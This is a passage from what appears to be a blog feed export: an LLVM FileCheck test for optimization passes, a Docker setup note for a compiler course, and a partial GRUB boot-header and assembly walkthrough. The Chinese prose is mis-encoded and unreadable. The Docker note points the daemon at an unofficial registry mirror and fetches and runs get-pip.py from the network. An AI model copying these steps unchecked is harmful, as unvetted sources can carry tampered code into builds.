class="highlight bash"><table><tr><td class="code"><pre><span class="line">; ç¬¬ä¸€é˜¶æ®µï¼šåªè¿è¡Œ AlgebraicIdentityPass</span><br><span class="line">; RUN: opt -load-pass-plugin=%dylibdir/libLocalOpts.so \</span><br><span class="line">; RUN:     -p=algebraic-identity \</span><br><span class="line">; RUN:     -S %s -o %basename_t.algebraic</span><br><span class="line">; RUN: FileCheck --check-prefix=CHECK-ALGEBRAIC %s --input-file=%basename_t.algebraic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; ç¬¬äºŒé˜¶æ®µï¼šè¿è¡Œ AlgebraicIdentityPass + StrengthReductionPass</span><br><span class="line">; RUN: opt -load-pass-plugin=%dylibdir/libLocalOpts.so \</span><br><span class="line">; RUN:     -p=algebraic-identity,strength-reduction \</span><br><span class="line">; RUN:     -S %s -o %basename_t.strength</span><br><span class="line">; RUN: FileCheck --check-prefix=CHECK-STRENGTH %s --input-file=%basename_t.strength</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; ç¬¬ä¸‰é˜¶æ®µï¼šè¿è¡Œæ‰€æœ‰ Pass</span><br><span class="line">; RUN: opt -load-pass-plugin=%dylibdir/libLocalOpts.so \</span><br><span class="line">; RUN:     -p=algebraic-identity,strength-reduction,multi-inst-opt \</span><br><span class="line">; RUN:     -S %s -o %basename_t.all</span><br><span class="line">; RUN: FileCheck --check-prefix=CHECK-ALL %s --input-file=%basename_t.all</span><br><span class="line"></span><br><span class="line">; <span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line">; void foo(int a) &#123;</span><br><span class="line">;   int r0 = a + 0;</span><br><span class="line">;   int r1 = r0 * 16;</span><br><span class="line">;   int r2 = r1 * r0;</span><br><span class="line">;   int r3 = r2 / a;</span><br><span class="line">;   int r4 = r2 / 10;</span><br><span class="line">;   int r5 = 54 * r3;</span><br><span class="line">;   int r6 = r4 / 128;</span><br><span class="line">;   int r7 = r5 / 54;</span><br><span class="line">;   int r8 = r4 / 1;</span><br><span class="line">;   int r9 = r7 - 0;</span><br><span class="line">;   <span class="built_in">printf</span>(<span class="string">&quot;%d,%d,%d,%d,%d,%d,%d,%d,%d,%d\n&quot;</span>, r0, r1, r2, r3, r4, r5, r6, r7, r8,</span><br><span class="line">;          r9);</span><br><span class="line">; &#125;</span><br><span class="line"></span><br><span class="line">@.str = private unnamed_addr constant [31 x i8] c<span class="string">&quot;%d,%d,%d,%d,%d,%d,%d,%d,%d,%d\0A\00&quot;</span>, align 1</span><br><span class="line"></span><br><span class="line">; æ£€æŸ¥ç¬¬ä¸€ä¸ªpass</span><br><span class="line">; CHECK-ALGEBRAIC-LABEL: define dso_local void @foo(i32 noundef %0) &#123;</span><br><span class="line">; æ£€æŸ¥åŠ æ³•ä¼˜åŒ–ï¼š%2 = add nsw i32 %0, 0 â†’ è¢«åˆ é™¤</span><br><span class="line">; CHECK-ALGEBRAIC-NOT:   add nsw i32 %0, 0</span><br><span class="line"></span><br><span class="line">; æ£€æŸ¥ä¹˜æ³•æŒ‡ä»¤ï¼ˆä½¿ç”¨%0æ›¿ä»£%2ï¼‰ï¼š</span><br><span class="line">; CHECK-ALGEBRAIC:       [[MUL1:%.*]] = mul nsw i32 %0, 16</span><br><span class="line">; CHECK-ALGEBRAIC-NEXT:  [[MUL2:%.*]] = mul nsw i32 [[MUL1]], %0</span><br><span class="line"></span><br><span class="line">; æ£€æŸ¥é™¤æ³•æŒ‡ä»¤ï¼š</span><br><span class="line">; CHECK-ALGEBRAIC:       [[DIV1:%.*]] = sdiv i32 [[MUL2]], %0</span><br><span class="line">; CHECK-ALGEBRAIC-NEXT:  [[DIV2:%.*]] = sdiv i32 [[MUL2]], 10</span><br><span class="line">; CHECK-ALGEBRAIC-NEXT:  [[MUL3:%.*]] = mul nsw i32 54, [[DIV1]]</span><br><span class="line">; CHECK-ALGEBRAIC-NEXT:  [[DIV3:%.*]] = sdiv i32 [[DIV2]], 128</span><br><span class="line">; CHECK-ALGEBRAIC-NEXT:  [[DIV4:%.*]] = sdiv i32 [[MUL3]], 54</span><br><span class="line"></span><br><span class="line">; æ£€æŸ¥é™¤æ³•ä¼˜åŒ–ï¼š%10 = sdiv i32 %6, 1 â†’ è¢«åˆ é™¤</span><br><span class="line">; CHECK-ALGEBRAIC-NOT:   &#123;&#123;.*&#125;&#125; = sdiv i32 &#123;&#123;.*&#125;&#125;, 1</span><br><span class="line"></span><br><span class="line">; æ£€æŸ¥å‡æ³•ä¼˜åŒ–ï¼š%11 = sub nsw i32 %9, 0 â†’ è¢«åˆ é™¤</span><br><span class="line">; CHECK-ALGEBRAIC-NOT:   &#123;&#123;.*&#125;&#125; = sub nsw i32 &#123;&#123;.*&#125;&#125;, 0</span><br><span class="line"></span><br><span class="line">; éªŒè¯<span class="built_in">printf</span>è°ƒç”¨å‚æ•°ï¼ˆä½¿ç”¨æ•è·çš„å˜é‡åï¼‰ï¼š</span><br><span class="line">; CHECK-ALGEBRAIC:       [[CALL1:%.*]] = call i32 (ptr, ...) @<span class="built_in">printf</span>(ptr noundef @.str, i32 noundef %0, i32 noundef [[MUL1]], i32 noundef [[MUL2]], i32 noundef [[DIV1]], i32 noundef [[DIV2]], i32 noundef [[MUL3]], i32 noundef [[DIV3]],  i32 noundef [[DIV4]], i32 noundef [[DIV2]], i32 noundef [[DIV4]])</span><br><span class="line">; CHECK-ALGEBRAIC-NEXT:       ret void</span><br><span class="line">; CHECK-ALGEBRAIC-NEXT:  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; æ£€æŸ¥ç¬¬äºŒä¸ªpass</span><br><span class="line">; CHECK-STRENGTH-LABEL: define dso_local void @foo(i32 noundef %0) &#123;</span><br><span class="line">; CHECK-STRENGTH:       [[SHL1:%.*]] = shl i32 %0, 4</span><br><span class="line">; CHECK-STRENGTH-NOT:   &#123;&#123;.*&#125;&#125; = mul nsw i32 &#123;&#123;.*&#125;&#125;, 16</span><br><span class="line"></span><br><span class="line">; CHECK-STRENGTH:       [[SHIFT2:%.*]] = ashr i32 &#123;&#123;%.*&#125;&#125;, 7</span><br><span class="line">; CHECK-STRENGTH-NOT:   sdiv i32 &#123;&#123;.*&#125;&#125;, 128</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; æ£€æŸ¥ç¬¬ä¸‰ä¸ªpass</span><br><span class="line">; CHECK-ALL-LABEL:      define dso_local void @foo(i32 noundef %0) &#123;</span><br><span class="line">define dso_local void @foo(i32 noundef %0) &#123;</span><br><span class="line">  %2 = add nsw i32 %0, 0</span><br><span class="line">  %3 = mul nsw i32 %2, 16</span><br><span class="line">  %4 = mul nsw i32 %3, %2</span><br><span class="line">  %5 = sdiv i32 %4, %0</span><br><span class="line">  %6 = sdiv i32 %4, 10</span><br><span class="line">  %7 = mul nsw i32 54, %5</span><br><span class="line">  %8 = sdiv i32 %6, 128</span><br><span class="line">  %9 = sdiv i32 %7, 54</span><br><span class="line">  %10 = sdiv i32 %6, 1</span><br><span class="line">  %11 = sub nsw i32 %9, 0</span><br><span class="line">  %12 = call i32 (ptr, ...) @<span class="built_in">printf</span>(ptr noundef @.str, i32 noundef %2, i32 noundef %3, i32 noundef %4, i32 noundef %5, i32 noundef %6, i32 noundef %7, i32 noundef %8, i32 noundef %9, i32 noundef %10, i32 noundef %11)</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">declare</span> i32 @<span class="built_in">printf</span>(ptr noundef, ...) <span class="comment">#1</span></span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20250701120117722.png" alt="passå‰"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20250701120035599.png" alt="passå"></p><p>å¯ä»¥çœ‹åˆ°ç¡®å®ä¼˜åŒ–æ‰äº†<code>sub nsw i32 %3, 3</code>è¿™è¡Œ</p>]]></content>
      
      
      <categories>
          
          <category> Base </category>
          
          <category> ç¼–è¯‘åŸç† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSCD70 2023s Assignment 0 Introduction to Docker è®°å½•</title>
      <link href="/2025/06/17/CSCD70%202023s%20Assignment%200%20Introduction%20to%20Docker%20%E8%AE%B0%E5%BD%95/"/>
      <url>/2025/06/17/CSCD70%202023s%20Assignment%200%20Introduction%20to%20Docker%20%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="CSCD70-2023s-Assignment-0-Introduction-to-Docker-è®°å½•"><a href="#CSCD70-2023s-Assignment-0-Introduction-to-Docker-è®°å½•" class="headerlink" title="CSCD70 2023s Assignment 0 Introduction to Docker è®°å½•"></a>CSCD70 2023s Assignment 0 Introduction to Docker è®°å½•</h1><p>æ›´æ–°ï¼šæˆ‘ä¹‹åæ›´æ¢ä¸ºäº†2023çš„å®éªŒï¼Œåªè¦ä¿®æ”¹daemon.jsonå³å¯</p><hr><p>ç›´æ¥è¿›è¡Œbuildè‚¯å®šä¼šå‡ºç°æ— æ³•è¿æ¥çš„æŠ¥é”™ã€‚</p><p>è¿™é‡Œç”±äºä¼—æ‰€å‘¨çŸ¥çš„åŸå› ï¼Œéœ€è¦é…ç½®æºï¼Œä½¿ç”¨ä»£ç†å’Œå¯¹dockeré…ç½®ä»£ç†ä»¥åŠåœ¨buildå‘½ä»¤ä¸­é…ç½®ä»£ç†éƒ½æ˜¯æ— æ•ˆçš„ï¼Œåªæœ‰é€šè¿‡æ¢æºæ¥è§£å†³ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nano /etc/docker/daemon.json</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–ç¼–è¾‘å™¨æ‰“å¼€ï¼Œä¿®æ”¹æˆ–åˆ›å»ºdaemon.jsonæ–‡ä»¶è¾“å…¥ä»¥ä¸‹è¯­å¥ï¼Œ</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://hub.h-k.pw&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹å®Œæˆåä¸è¦ç€æ€¥buildï¼Œéœ€è¦ä¿®æ”¹ä¸€ä¸‹dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> LLVM_VERSION=<span class="number">12</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="bash">    env DEBIAN_FRONTEND=noninteractive \</span></span><br><span class="line"><span class="bash">    apt-get install -y \</span></span><br><span class="line"><span class="bash">        vim git build-essential python3-dev \</span></span><br><span class="line"><span class="bash">        wget ca-certificates \</span></span><br><span class="line"><span class="bash">        lsb-release software-properties-common gpg-agent &amp;&amp; \</span></span><br><span class="line"><span class="bash">    rm -rf /var/lib/apt/lists/*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key | apt-key add - &amp;&amp; \</span></span><br><span class="line"><span class="bash">    add-apt-repository <span class="string">&quot;deb http://apt.llvm.org/focal/ llvm-toolchain-focal-<span class="variable">$&#123;LLVM_VERSION&#125;</span> main&quot;</span> &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt-get install -y llvm-<span class="variable">$&#123;LLVM_VERSION&#125;</span> llvm-<span class="variable">$&#123;LLVM_VERSION&#125;</span>-dev \</span></span><br><span class="line"><span class="bash">                       clang-<span class="variable">$&#123;LLVM_VERSION&#125;</span> \</span></span><br><span class="line"><span class="bash">                       clang-format-<span class="variable">$&#123;LLVM_VERSION&#125;</span> \</span></span><br><span class="line"><span class="bash">                       clang-tidy-<span class="variable">$&#123;LLVM_VERSION&#125;</span> &amp;&amp; \</span></span><br><span class="line"><span class="bash">    rm -rf /var/lib/apt/lists/*</span></span><br><span class="line"><span class="comment">#-------------ä¿®æ”¹çš„éƒ¨åˆ†--------------</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> wget https://bootstrap.pypa.io/pip/3.8/get-pip.py &amp;&amp; \</span></span><br><span class="line"><span class="bash">    python3 get-pip.py &amp;&amp; \</span></span><br><span class="line"><span class="bash">    rm -f get-pip.py</span></span><br><span class="line"><span class="comment">#------------------------------------</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip3 install lit==0.11.0 cmake==3.18.4</span></span><br></pre></td></tr></table></figure><p>ä¸»è¦æ˜¯é»˜è®¤çš„pipå·²ç»ä¸å…¼å®¹ubuntu20.04é»˜è®¤è‡ªå¸¦çš„python3.8äº†ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦æ”¹å˜ä¸€ä¸‹ã€‚</p><p>è¿™æ ·buildè¿‡ç¨‹å°±æ²¡æœ‰ä»€ä¹ˆé—®é¢˜äº†ï¼Œå¯ä»¥è¿›è¡Œåé¢çš„æµ‹è¯•äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Base </category>
          
          <category> ç¼–è¯‘åŸç† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>COSMOS è®¾ç½®å·¥ä½œæ¨¡å¼ä¸ç¯å¢ƒ</title>
      <link href="/2024/05/22/COSMOS-%E8%AE%BE%E7%BD%AE%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E4%B8%8E%E7%8E%AF%E5%A2%83/"/>
      <url>/2024/05/22/COSMOS-%E8%AE%BE%E7%BD%AE%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E4%B8%8E%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™æ®µæ—¶é—´ä¸€ç›´åœ¨å­¦ä¹ å†™æ“ä½œç³»ç»Ÿï¼Œçœ‹äº†ç½‘ä¸ŠLMOSè€å¸ˆçš„è¯¾ï¼Œæ¢³ç†ä¸€ä¸‹ç¬¬10åˆ°12è¯¾æ‰€å­¦çš„çŸ¥è¯†ï¼Œé‡ç‚¹æ˜¯å¯¹ä»£ç æµç¨‹çš„ç®€å•æè¿°ï¼Œå¹¶å¯¹è¯¾ç¨‹å†…å®¹æˆ‘ä¸ªäººä¹‹å‰ä¸æ¸…æ¥šçš„åœ°æ–¹åšç®€è¦è¡¥å……è®°å½•ï¼Œä»¥ä¾›åé¢æŸ¥æ‰¾ã€‚</p><h1 id="å®ç°GRUBå¤´"><a href="#å®ç°GRUBå¤´" class="headerlink" title="å®ç°GRUBå¤´"></a>å®ç°GRUBå¤´</h1><h2 id="é¦–å…ˆå…ˆçœ‹ä¸¤ä¸ªç»“æ„ä½“"><a href="#é¦–å…ˆå…ˆçœ‹ä¸¤ä¸ªç»“æ„ä½“" class="headerlink" title="é¦–å…ˆå…ˆçœ‹ä¸¤ä¸ªç»“æ„ä½“"></a>é¦–å…ˆå…ˆçœ‹ä¸¤ä¸ªç»“æ„ä½“</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ˜ åƒæ–‡ä»¶å¤´æè¿°ç¬¦</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">s_mlosrddsc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_mgic; <span class="comment">//æ˜ åƒæ–‡ä»¶æ ‡è¯†</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_sfsum;<span class="comment">//æœªä½¿ç”¨</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_sfsoff;<span class="comment">//æœªä½¿ç”¨</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_sfeoff;<span class="comment">//æœªä½¿ç”¨</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_sfrlsz;<span class="comment">//æœªä½¿ç”¨</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_ldrbk_s;<span class="comment">//æ˜ åƒæ–‡ä»¶ä¸­äºŒçº§å¼•å¯¼å™¨çš„å¼€å§‹åç§»</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_ldrbk_e;<span class="comment">//æ˜ åƒæ–‡ä»¶ä¸­äºŒçº§å¼•å¯¼å™¨çš„ç»“æŸåç§»</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_ldrbk_rsz;<span class="comment">//æ˜ åƒæ–‡ä»¶ä¸­äºŒçº§å¼•å¯¼å™¨çš„å®é™…å¤§å°</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_ldrbk_sum;<span class="comment">//æ˜ åƒæ–‡ä»¶ä¸­äºŒçº§å¼•å¯¼å™¨çš„æ ¡éªŒå’Œ</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_fhdbk_s;<span class="comment">//æ˜ åƒæ–‡ä»¶ä¸­æ–‡ä»¶å¤´æè¿°çš„å¼€å§‹åç§»</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_fhdbk_e;<span class="comment">//æ˜ åƒæ–‡ä»¶ä¸­æ–‡ä»¶å¤´æè¿°çš„ç»“æŸåç§»</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_fhdbk_rsz;<span class="comment">//æ˜ åƒæ–‡ä»¶ä¸­æ–‡ä»¶å¤´æè¿°çš„å®é™…å¤§å°</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_fhdbk_sum;<span class="comment">//æ˜ åƒæ–‡ä»¶ä¸­æ–‡ä»¶å¤´æè¿°çš„æ ¡éªŒå’Œ</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_filbk_s;<span class="comment">//æ˜ åƒæ–‡ä»¶ä¸­æ–‡ä»¶æ•°æ®çš„å¼€å§‹åç§»</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_filbk_e;<span class="comment">//æ˜ åƒæ–‡ä»¶ä¸­æ–‡ä»¶æ•°æ®çš„ç»“æŸåç§»</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_filbk_rsz;<span class="comment">//æ˜ åƒæ–‡ä»¶ä¸­æ–‡ä»¶æ•°æ®çš„å®é™…å¤§å°</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_filbk_sum;<span class="comment">//æ˜ åƒæ–‡ä»¶ä¸­æ–‡ä»¶æ•°æ®çš„æ ¡éªŒå’Œ</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_ldrcodenr;<span class="comment">//æ˜ åƒæ–‡ä»¶ä¸­äºŒçº§å¼•å¯¼å™¨çš„æ–‡ä»¶å¤´æè¿°ç¬¦çš„ç´¢å¼•å·</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_fhdnr;<span class="comment">//æ˜ åƒæ–‡ä»¶ä¸­æ–‡ä»¶å¤´æè¿°ç¬¦æœ‰å¤šå°‘ä¸ª</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_filnr;<span class="comment">//æ˜ åƒæ–‡ä»¶ä¸­æ–‡ä»¶å¤´æœ‰å¤šå°‘ä¸ª</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_endgic;<span class="comment">//æ˜ åƒæ–‡ä»¶ç»“æŸæ ‡è¯†</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_rv;<span class="comment">//æ˜ åƒæ–‡ä»¶ç‰ˆæœ¬</span></span><br><span class="line">&#125;<span class="keyword">mlosrddsc_t</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ–‡ä»¶å¤´æè¿°ç¬¦</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">s_fhdsc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_type;<span class="comment">//æ–‡ä»¶ç±»å‹</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_subtype;<span class="comment">//æ–‡ä»¶å­ç±»å‹</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_stuts;<span class="comment">//æ–‡ä»¶çŠ¶æ€</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_id;<span class="comment">//æ–‡ä»¶id</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_intsfsoff;<span class="comment">//æ–‡ä»¶åœ¨æ˜ åƒæ–‡ä»¶ä½ç½®å¼€å§‹åç§»</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_intsfend;<span class="comment">//æ–‡ä»¶åœ¨æ˜ åƒæ–‡ä»¶çš„ç»“æŸåç§»</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_frealsz;<span class="comment">//æ–‡ä»¶å®é™…å¤§å°</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_fsum;<span class="comment">//æ–‡ä»¶æ ¡éªŒå’Œ</span></span><br><span class="line">    <span class="keyword">char</span>   fhd_name[FHDSC_NMAX];<span class="comment">//æ–‡ä»¶å</span></span><br><span class="line">&#125;<span class="keyword">fhdsc_t</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™ä¸¤ä¸ªç»“æ„ä½“ç”±<em>lmoskrlimg</em>å†™å…¥ï¼Œåé¢å¦‚ä½•æ‰“åŒ…èµ·æ¥è¿™é‡Œå…ˆä¸è°ˆï¼Œæˆ‘ä»¬ç°åœ¨åªéœ€è¦çŸ¥é“è¿™æ˜¯ç›´æ¥å†™å¥½åœ¨æ–‡ä»¶ä¸­ç›´æ¥æ˜ å°„åˆ°å†…å­˜çš„ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨ä»£ç ä¸­å†™å…¥æ˜ åƒæ–‡ä»¶å¤´æè¿°ç¬¦çš„åœ°å€å³å¯</p><h2 id="GRUBå¤´"><a href="#GRUBå¤´" class="headerlink" title="GRUBå¤´"></a>GRUBå¤´</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MBT_HDR_FLAGSEQU 0x00010003;flagå­—æ®µï¼ŒæŒ‡å‡ºOSæ˜ åƒéœ€è¦å¼•å¯¼ç¨‹åºæä¾›æˆ–æ”¯æŒçš„ç‰¹æ€§</span><br><span class="line">MBT_HDR_MAGICEQU 0x1BADB002;å¤šå¼•å¯¼åè®®å¤´é­”æ•°</span><br><span class="line">MBT2_MAGICEQU 0xe85250d6;ç¬¬äºŒç‰ˆå¤šå¼•å¯¼åè®®å¤´é­”æ•°</span><br><span class="line">global _start;å¯¼å‡º_startç¬¦å·</span><br><span class="line">extern inithead_entry;å¯¼å…¥å¤–éƒ¨çš„inithead_entryå‡½æ•°ç¬¦å·</span><br><span class="line">[section .text];å®šä¹‰.textä»£ç èŠ‚</span><br><span class="line">[bits 32];æ±‡ç¼–æˆ32ä½ä»£ç </span><br><span class="line">_start:</span><br><span class="line">jmp _entry</span><br><span class="line">align 4</span><br><span class="line">mbt_hdr:</span><br><span class="line">dd MBT_HDR_MAGIC</span><br><span class="line">dd MBT_HDR_FLAGS</span><br><span class="line">dd -(MBT_HDR_MAGIC+MBT_HDR_FLAGS)</span><br><span class="line">dd mbt_hdr</span><br><span class="line">dd _start</span><br><span class="line">dd 0</span><br><span class="line">dd 0</span><br><span class="line">dd _entry</span><br><span class="line">;ä»¥ä¸Šæ˜¯GRUBæ‰€éœ€è¦çš„å¤´</span><br><span class="line">ALIGN 8</span><br><span class="line">mbhdr:</span><br><span class="line">DD0xE85250D6</span><br><span class="line">DD0</span><br><span class="line">DDmhdrend - mbhdr</span><br><span class="line">DD-(0xE85250D6 + 0 + (mhdrend - mbhdr))</span><br><span class="line">DW2, 0</span><br><span class="line">DD24</span><br><span class="line">DDmbhdr</span><br><span class="line">DD_start</span><br><span class="line">DD0</span><br><span class="line">DD0</span><br><span class="line">DW3, 0</span><br><span class="line">DD12</span><br><span class="line">DD_entry </span><br><span class="line">DD      0  </span><br><span class="line">DW0, 0</span><br><span class="line">DD8</span><br><span class="line">mhdrend:</span><br><span class="line">;ä»¥ä¸Šæ˜¯GRUB2æ‰€éœ€è¦çš„å¤´</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„æ•°æ®æ—¢æ˜¯GRUBï¼Œï¼Œè¿™éƒ¨åˆ†åŸºæœ¬ä¸Šæ˜¯å›ºå®šçš„ï¼Œä¸è¿‡æ˜¯æä¾›ç»™grubå’Œgrub2æ‰€éœ€è¦åˆ°çš„å¤´è®©å…¶è¯†åˆ«ç½¢äº†ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„startå‡½æ•°è·³è½¬åˆ°entryå‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_entry:</span><br><span class="line">    ;å…³ä¸­æ–­</span><br><span class="line">cli</span><br><span class="line">    ;å…³ä¸å¯å±è”½ä¸­æ–­</span><br><span class="line">in al, 0x70</span><br><span class="line">or al, 0x80</span><br><span class="line">out 0x70,al</span><br><span class="line">    ;é‡æ–°åŠ è½½GDT</span><br><span class="line">lgdt [GDT_PTR]</span><br><span class="line">jmp dword 0x8 :_32bits_mode</span><br></pre></td></tr></table></figure><p>entryå‡½æ•°çš„ç›®çš„æ˜¯å…³é—­ä¸­æ–­å¹¶åŠ è½½åŠ è½½GDTåœ°å€åˆ°GDTRå¯„å­˜å™¨,ä¸‹é¢çš„æ•°æ®å°±æ˜¯GDTï¼Œæ˜¯æ®µæè¿°ç¬¦è¡¨ï¼Œè¿™é‡Œå°±ä¸è¯¦ç»†å±•å¼€äº†ï¼Œæ³¨é‡Šæœ‰ç®€å•è§£é‡Š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GDT_START:</span><br><span class="line">knull_dsc: dq 0;ä¸€ä¸ªç©ºæè¿°ç¬¦ï¼Œç”¨äºä¿æŠ¤æ¨¡å¼ä¸‹çš„é”™è¯¯æ£€æŸ¥ã€‚</span><br><span class="line">kcode_dsc: dq 0x00cf9e000000ffff;32ä½ä»£ç æ®µæè¿°ç¬¦ï¼Œè®¿é—®ä½ a-e</span><br><span class="line">kdata_dsc: dq 0x00cf92000000ffff;32ä½æ•°æ®æ®µæè¿°ç¬¦ã€‚</span><br><span class="line">k16cd_dsc: dq 0x00009e000000ffff;16ä½ä»£ç æ®µæè¿°ç¬¦ï¼Œè®¿é—®ä½ a-e</span><br><span class="line">k16da_dsc: dq 0x000092000000ffff;16ä½æ•°æ®æ®µæè¿°ç¬¦</span><br><span class="line">GDT_END:</span><br><span class="line">GDT_PTR:</span><br><span class="line">GDTLENdw GDT_END-GDT_START-1;GDTç•Œé™</span><br><span class="line">GDTBASEdd GDT_START;GDT çš„åŸºåœ°å€</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„entryåšå®Œå…¶ä»»åŠ¡ååˆè·³è½¬åˆ°32bits_modeå‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_32bits_mode:</span><br><span class="line">;ä¸‹é¢åˆå§‹åŒ–Cè¯­è¨€å¯èƒ½ä¼šç”¨åˆ°çš„å¯„å­˜å™¨</span><br><span class="line">mov ax, 0x10; æ•°æ®æ®µé€‰æ‹©å­(ç›®çš„)ï¼Œ0000 0000 0001 0000ï¼Œç´¢å¼•ä¸º2ï¼Œ32ä½æ•°æ®æ®µæè¿°ç¬¦</span><br><span class="line">mov ds, ax</span><br><span class="line">mov ss, ax</span><br><span class="line">mov es, ax</span><br><span class="line">mov fs, ax</span><br><span class="line">mov gs, ax</span><br><span class="line">xor eax,eax</span><br><span class="line">xor ebx,ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">xor edi,edi</span><br><span class="line">xor esi,esi</span><br><span class="line">xor ebp,ebp</span><br><span class="line">xor esp,esp</span><br><span class="line">    ;åˆå§‹åŒ–æ ˆï¼ŒCè¯­è¨€éœ€è¦æ ˆæ‰èƒ½å·¥ä½œ</span><br><span class="line">mov esp,0x7c00</span><br><span class="line">    ;è°ƒç”¨Cè¯­è¨€å‡½æ•°inithead_entry</span><br><span class="line">call inithead_entry</span><br><span class="line">jmp 0x200000;inithead_entryåœ¨inithead_entryå¯¼å…¥çš„initldrkrl.bin</span><br></pre></td></tr></table></figure><p>32bits_modeå°†æ®µå¯„å­˜å™¨çš„æ®µå¯„å­˜å™¨å†…çš„é€‰æ‹©å­ç´¢å¼•æŒ‡å‘çš„è®¾ç½®åˆ°32ä½æ•°æ®æ®µæè¿°ç¬¦ä¸Šï¼Œå¹¶åˆå§‹åŒ–å¯„å­˜å™¨è¿˜æœ‰æ ˆï¼Œä¸ºåé¢è°ƒç”¨Cå‡½æ•°åšé“ºå«ï¼Œæˆ‘ä»¬å…ˆæ¥ç®€å•çœ‹çœ‹inithead_entryå‡½æ•°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inithead_entry</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    init_curs();<span class="comment">//åˆå§‹åŒ–cursor_tç»“æ„ä½“</span></span><br><span class="line">    close_curs();<span class="comment">//å…³é—­å…‰æ 